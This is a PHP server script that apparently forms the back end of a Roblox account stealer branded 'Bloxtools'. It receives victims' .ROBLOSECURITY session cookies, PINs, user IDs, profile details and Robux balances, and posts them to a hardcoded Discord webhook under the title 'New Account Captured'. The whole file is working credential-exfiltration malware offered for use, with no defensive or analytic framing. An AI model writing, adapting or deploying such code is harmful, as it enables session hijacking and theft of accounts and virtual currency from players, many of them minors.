<?php
// ============================================================
// HIDDEN DISCORD WEBHOOK - STORE ONLY ON SERVER
// ============================================================
$DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";

// Optional: Simple auth token to prevent random POSTs
$SECRET_TOKEN = "YourRandomSecret123!";

// ============================================================
// 1. Verify request method & content type
// ============================================================
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method not allowed');
}

// 2. Check secret token (optional but recommended)
$headers = getallheaders();
if (!isset($headers['X-Auth-Token']) || $headers['X-Auth-Token'] !== $SECRET_TOKEN) {
    http_response_code(403);
    exit('Forbidden');
}

// 3. Read JSON input
$rawInput = file_get_contents('php://input');
$data = json_decode($rawInput, true);
if (!$data) {
    http_response_code(400);
    exit('Invalid JSON');
}

// 4. Extract fields
$pin = $data['pin'] ?? '';
$cookie = $data['cookie'] ?? '';
$rbxuid = $data['rbxuid'] ?? '';
$userInfo = $data['userInfo'] ?? null;
$robux = $data['robux'] ?? 'N/A';

// ============================================================
// 5. Build Discord embed (same as your original code)
// ============================================================
$description = "## 📦 Account Capture\n\n"
    . "- **rbxuid:** `{$rbxuid}`\n"
    . "- **Cookie Length:** " . strlen($cookie) . " chars\n\n"
    . "## 🔐 Full .ROBLOSECURITY Cookie\n```\n{$cookie}\n```";

$embedFields = [];

if ($userInfo && isset($userInfo['username'])) {
    $profileUrl = "https://www.roblox.com/users/{$rbxuid}/profile";
    $embedFields[] = [
        "name" => "👤 Roblox Profile",
        "value" => "**Username:** {$userInfo['username']}\n"
                 . "**Display Name:** {$userInfo['displayName']}\n"
                 . "**User ID:** {$userInfo['userId']}\n"
                 . "**Join Date:** {$userInfo['joinDate']}\n\n"
                 . "🔗 [Profile]({$profileUrl})",
        "inline" => false
    ];
    $embedFields[] = ["name" => "👥 Friends", "value" => $userInfo['friendsCount'], "inline" => true];
    $embedFields[] = ["name" => "💰 Robux", "value" => $robux . " R$", "inline" => true];
    $embedFields[] = ["name" => "👕 Wearing", "value" => $userInfo['wearing'] ?? "Unknown", "inline" => false];
} else {
    $embedFields[] = [
        "name" => "⚠️ Error",
        "value" => "Could not fetch public profile information.\nUser may be deleted, banned, or invalid.",
        "inline" => false
    ];
}

$embedFields[] = [
    "name" => "🔐 Cookie Summary",
    "value" => "**Length:** " . strlen($cookie) . " characters\n**rbxuid:** {$rbxuid}",
    "inline" => false
];

$discordPayload = [
    "username" => "Bloxtools Processing System",
    "embeds" => [[
        "title" => "🔓 New Account Captured",
        "description" => $description,
        "color" => 0x8c52ff,
        "thumbnail" => ($userInfo && isset($userInfo['avatarUrl'])) ? ["url" => $userInfo['avatarUrl']] : null,
        "fields" => $embedFields,
        "footer" => ["text" => "Bloxtools • Roblox Account Logger"],
        "timestamp" => date('c')
    ]]
];

// Remove null thumbnail
if ($discordPayload['embeds'][0]['thumbnail'] === null) {
    unset($discordPayload['embeds'][0]['thumbnail']);
}

// ============================================================
// 6. Send to Discord Webhook
// ============================================================
$ch = curl_init($DISCORD_WEBHOOK_URL);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($discordPayload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Keep secure

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// ============================================================
// 7. Return result to frontend
// ============================================================
if ($httpCode === 204 || $httpCode === 200) {
    http_response_code(200);
    echo json_encode(["success" => true]);
} else {
    http_response_code(500);
    echo json_encode(["success" => false, "error" => "Discord webhook failed with HTTP $httpCode"]);
}
?>
